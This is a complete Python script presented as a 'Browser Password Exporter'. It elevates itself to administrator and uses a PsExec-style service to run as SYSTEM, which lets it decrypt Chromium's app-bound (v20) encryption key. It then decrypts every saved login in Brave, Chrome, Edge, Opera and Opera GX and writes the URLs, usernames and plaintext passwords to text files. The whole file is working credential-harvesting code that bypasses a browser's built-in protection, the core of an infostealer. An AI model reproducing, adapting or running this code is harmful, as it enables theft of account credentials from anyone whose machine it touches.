import ctypes
import sys
import time
import struct
import io
import shutil
import tempfile
import os
import json
import binascii
from pypsexec.client import Client
from Crypto.Cipher import AES
import sqlite3

if sys.platform.startswith('win'):
    try:
        if sys.stdout and hasattr(sys.stdout, "buffer"):
            import codecs
            sys.stdout = codecs.getwriter("utf-8")(sys.stdout.detach())
        if sys.stderr and hasattr(sys.stderr, "buffer"):
            import codecs
            sys.stderr = codecs.getwriter("utf-8")(sys.stderr.detach())
    except:
        pass

def isAdmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

if not isAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

scriptDir = os.path.dirname(os.path.abspath(__file__))
outputDir = os.path.join(scriptDir, "BrowserPasswords")
os.makedirs(outputDir, exist_ok=True)

userProfile = os.environ['USERPROFILE']

browsers = [
    ("Brave", rf"{userProfile}\AppData\Local\BraveSoftware\Brave-Browser\User Data"),
    ("Chrome", rf"{userProfile}\AppData\Local\Google\Chrome\User Data"),
    ("Edge", rf"{userProfile}\AppData\Local\Microsoft\Edge\User Data"),
    ("Opera", rf"{userProfile}\AppData\Roaming\Opera Software\Opera Stable"),
    ("OperaGX", rf"{userProfile}\AppData\Roaming\Opera Software\Opera GX Stable"),
]

allResults = {
    'passwords': [],
    'stats': {}
}

def getV20Key(browserPath):
    try:
        localStatePath = os.path.join(browserPath, "Local State")
        if not os.path.exists(localStatePath):
            return None
        with open(localStatePath, "r", encoding="utf-8") as f:
            localState = json.load(f)
        if "app_bound_encrypted_key" not in localState.get("os_crypt", {}):
            return None
        appBoundEncryptedKey = localState["os_crypt"]["app_bound_encrypted_key"]
        arguments = "-c \"import win32crypt,binascii;key=win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'),None,None,None,0)[1];print(binascii.b2a_base64(key).decode())\""
        c = Client("localhost")
        c.connect()
        try:
            c.create_service()
            time.sleep(2)
            assert binascii.a2b_base64(appBoundEncryptedKey)[:4] == b"APPB"
            appBoundKeyB64 = binascii.b2a_base64(binascii.a2b_base64(appBoundEncryptedKey)[4:]).decode().strip()
            encryptedKeyB64, _, rc = c.run_executable(sys.executable, arguments=arguments.format(appBoundKeyB64), use_system_account=True)
            if rc != 0:
                return None
            decryptedKeyB64, _, rc = c.run_executable(sys.executable, arguments=arguments.format(encryptedKeyB64.decode().strip()), use_system_account=False)
            if rc != 0:
                return None
            decryptedBlob = binascii.a2b_base64(decryptedKeyB64)
        finally:
            try:
                time.sleep(2)
                c.remove_service()
                time.sleep(1)
                c.disconnect()
            except:
                pass
        buffer = io.BytesIO(decryptedBlob)
        headerLen = struct.unpack('<I', buffer.read(4))[0]
        buffer.read(headerLen)
        contentLen = struct.unpack('<I', buffer.read(4))[0]
        masterKey = buffer.read(contentLen)
        return masterKey
    except:
        return None

def getV10Key(browserPath):
    try:
        localStatePath = os.path.join(browserPath, "Local State")
        if not os.path.exists(localStatePath):
            return None
        with open(localStatePath, "r", encoding="utf-8") as f:
            localState = json.load(f)
        import base64
        encryptedKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])[5:]
        import win32crypt
        return win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
    except:
        return None

def decryptPassword(encryptedValue, v10Key, v20Key):
    try:
        if encryptedValue[:3] == b"v20":
            if not v20Key:
                return None
            iv = encryptedValue[3:15]
            ciphertext = encryptedValue[15:-16]
            tag = encryptedValue[-16:]
            cipher = AES.new(v20Key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        elif encryptedValue[:3] in (b"v10", b"v11"):
            if not v10Key:
                return None
            iv = encryptedValue[3:15]
            ciphertext = encryptedValue[15:-16]
            tag = encryptedValue[-16:]
            cipher = AES.new(v10Key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        else:
            import win32crypt
            return win32crypt.CryptUnprotectData(encryptedValue, None, None, None, 0)[1].decode('utf-8')
    except:
        return None

def extractBrowserData(browserName, browserPath):
    v10Key = getV10Key(browserPath)
    v20Key = getV20Key(browserPath)
    if not v10Key and not v20Key:
        return

    passwords = []

    loginDbPath = os.path.join(browserPath, "Default", "Login Data")
    if os.path.exists(loginDbPath):
        tempDb = os.path.join(tempfile.gettempdir(), f"login_{browserName}.db")
        try:
            shutil.copy2(loginDbPath, tempDb)
            con = sqlite3.connect(tempDb)
            cur = con.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, username, encryptedPassword in cur.fetchall():
                if encryptedPassword:
                    password = decryptPassword(encryptedPassword, v10Key, v20Key)
                    if password:
                        passwords.append({
                            'browser': browserName,
                            'url': url,
                            'username': username,
                            'password': password
                        })
            con.close()
        except:
            pass
        finally:
            if os.path.exists(tempDb):
                try: os.remove(tempDb)
                except: pass

    allResults['passwords'].extend(passwords)
    allResults['stats'][browserName] = len(passwords)

def saveResults():
    allFile = os.path.join(outputDir, "All_Browser_Passwords.txt")
    with open(allFile, "w", encoding="utf-8") as f:
        f.write("SAVED BROWSER PASSWORDS\n")
        f.write("=" * 80 + "\n\n")
        for p in allResults['passwords']:
            f.write(f"Browser : {p['browser']}\n")
            f.write(f"URL     : {p['url']}\n")
            f.write(f"Username: {p['username']}\n")
            f.write(f"Password: {p['password']}\n")
            f.write("-" * 80 + "\n\n")

    for browser in set(p['browser'] for p in allResults['passwords']):
        safeName = "".join(c if c.isalnum() or c in " _-" else "_" for c in browser)
        browserFile = os.path.join(outputDir, f"{safeName}_Passwords.txt")
        with open(browserFile, "w", encoding="utf-8") as f:
            for p in allResults['passwords']:
                if p['browser'] == browser:
                    f.write(f"URL     : {p['url']}\n")
                    f.write(f"Username: {p['username']}\n")
                    f.write(f"Password: {p['password']}\n")
                    f.write("-" * 80 + "\n\n")

    summaryFile = os.path.join(outputDir, "Summary.txt")
    with open(summaryFile, "w", encoding="utf-8") as f:
        f.write("Browser Password Export Summary\n")
        f.write("=" * 50 + "\n\n")
        total = 0
        for browser, count in allResults['stats'].items():
            f.write(f"{browser}: {count} passwords\n")
            total += count
        f.write(f"\nTotal passwords found: {total}\n")
        f.write(f"Results saved in: {outputDir}\n")

    print(f"\nExport completed!")
    print(f"Found {len(allResults['passwords'])} passwords")
    print(f"Saved to: {outputDir}")

def main():
    print("Browser Password Exporter")
    print("Requires admin rights - elevating if needed...\n")
    for browserName, browserPath in browsers:
        if os.path.exists(browserPath):
            print(f"Processing {browserName}...")
            extractBrowserData(browserName, browserPath)
        else:
            print(f"{browserName} not found")
    if allResults['passwords']:
        saveResults()
    else:
        print("\nNo passwords found.")

if __name__ == "__main__":
    main()